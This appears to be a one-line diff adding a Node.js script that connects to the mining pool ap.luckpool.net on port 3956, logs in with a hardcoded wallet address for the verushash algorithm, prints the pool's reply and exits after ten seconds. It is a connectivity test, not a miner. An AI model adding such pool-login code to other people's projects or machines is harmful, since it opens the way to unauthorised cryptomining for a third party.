@@ -1,0 +1,1 @@
+const net=require('net'); const s=net.connect(3956,'ap.luckpool.net',()=>{ s.write(JSON.stringify({id:1,method:'login',params:{login:'RS3cJERG58N2GJbZSP3MpkFunACZ4kawpZ.worker',pass:'x',agent:'test',algo:['verushash']}})+'\n'); }); s.on('data', d=>console.log(d.toString())); setTimeout(()=>process.exit(0), 10000);
